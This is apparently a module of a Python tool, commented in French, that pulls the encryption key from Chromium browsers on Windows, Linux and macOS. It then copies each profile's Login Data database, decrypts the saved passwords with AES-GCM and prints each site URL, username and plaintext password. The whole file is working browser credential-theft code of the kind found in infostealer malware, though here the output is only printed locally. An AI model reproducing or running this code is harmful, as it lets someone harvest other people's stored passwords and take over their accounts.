from Crypto.Cipher import AES
import subprocess
import shutil
import json
import base64
import os
import sqlite3

from main import IS_WINDOWS, IS_LINUX, IS_MAC
from config import CHROMIUM_BROWSERS

# Fonction pour récupérer la clé de chiffrement
def get_encryption_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.load(file)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]

        if IS_WINDOWS:
            import win32crypt
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        elif IS_LINUX:
            return subprocess.check_output(
                ["secret-tool", "lookup", "chrome", "os_crypt"]
            ).strip()

        elif IS_MAC:
            return (
                subprocess.check_output(
                    [
                        "security",
                        "find-generic-password",
                        "-s",
                        "Chrome Safe Storage",
                        "-w",
                    ]
                )
                .strip()
                .encode()
            )

    except Exception as e:
        print(f"❌ Erreur récupération clé : {e}")
        return None


# Fonction pour déchiffrer un mot de passe
def decrypt_password(encrypted_password, key):
    try:
        if encrypted_password[:3] != b"v10":
            return "Format inconnu"

        iv = encrypted_password[3:15]  # IV de 12 octets
        payload = encrypted_password[15:-16]  # Données chiffrées
        tag = encrypted_password[-16:]  # Tag d'authentification AES-GCM

        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt_and_verify(payload, tag).decode()
    except Exception:
        return "Format inconnu"


# Fonction pour extraire les mots de passe stockés
def extract_passwords():
    for browser, paths in CHROMIUM_BROWSERS.items():
        if IS_WINDOWS:
            user_data_path = paths["windows"]
        elif IS_LINUX:
            user_data_path = paths["linux"]
        else:
            user_data_path = paths["mac"]

        if not user_data_path.exists():
            continue

        local_state_path = user_data_path / "Local State"
        if not local_state_path.exists():
            continue

        key = get_encryption_key(local_state_path)
        if key is None:
            continue

        print(f"\n=====  {browser} ✅  =====")

        # Enregistrer ça sous la forme d'un objet Profile avec le nom, le chemin, et les possibles fichiers de mots de passe
        class Profile:
            def __init__(self, name, path, files):
                self.name = name
                self.path = path
                self.files = files

        # Lister tous les profils utilisateurs
        # Recherche de tous les dossiers qui contiennent Login Data ou Login Data For Account
        profiles = []
        for profile in user_data_path.iterdir():
            if profile.is_dir():
                files = [
                    file
                    for file in profile.glob("Login Data*")
                    if file.name in ["Login Data", "Login Data For Account"]
                ]
                if files:
                    profiles.append(Profile(profile.name, profile, files))

        if not profiles:
            print("❌ Aucun profil trouvé")
            continue
        else:
            print(f"👤 {len(profiles)} Profil(s) trouvé(s)")

        for profile in profiles:
            nb_pass = 0
            print(f"\n🔍 Profil: {profile.name}")

            for login_db in profile.files:

                # Copie temporaire du fichier de mots de passe
                temp_db = login_db.with_suffix(".temp")
                shutil.copy(login_db, temp_db)

                try:
                    conn = sqlite3.connect(str(temp_db))
                    cursor = conn.cursor()
                    cursor.execute(
                        "SELECT origin_url, action_url, username_value, password_value FROM logins"
                    )

                    counter = 0
                    for (
                        origin_url,
                        action_url,
                        username,
                        encrypted_password,
                    ) in cursor.fetchall():
                        password = decrypt_password(encrypted_password, key)
                        if password and password != "Format inconnu":
                            print(f"[🌍] URL d'origine: {origin_url}")
                            print(f"[🌍] URL de login: {action_url}")
                            print(f"[👤] Username: {username}")
                            print(f"[🔑] Password: {password}\n")
                            counter += 1
                            # Uniquement les 3 premiers résultats pour tester
                            if counter > 2:
                                break
                            nb_pass += 1

                    conn.close()
                    os.remove(temp_db)

                except Exception as e:
                    print(f"❌ Erreur extraction {browser} : {e}")

            if nb_pass == 0:
                print("❌ Aucun mot de passe trouvé")
            else:
                print(f"🔑 {nb_pass} mot(s) de passe trouvé(s)")
